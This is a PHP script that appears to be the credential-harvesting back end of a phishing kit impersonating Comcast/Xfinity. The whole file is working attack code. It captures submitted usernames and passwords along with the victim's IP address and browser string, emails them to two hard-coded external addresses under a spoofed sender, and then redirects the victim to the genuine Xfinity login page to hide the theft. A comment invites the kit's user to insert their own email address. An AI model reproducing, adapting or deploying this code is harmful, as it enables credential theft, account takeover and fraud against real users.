<?php
session_start();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]User:       ".$_POST['username']."\n";
$message .= "[+]Pass:       ".$_POST['password']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){

$send = "easysmartwork@yandex.com, brainiaceasysquad@gmail.com";   //<--------Your email there

$subject = $pra." - Comcasta - [".$_POST['username']."]";
$headers = "From: Comcasta0".$pra."<bursted@".$pra."0comcasta.com>";
mail($send,$subject,$message,$headers);
header("Location: https://login.xfinity.com/login");
}else{
header("Location: index.php");
}	 
?>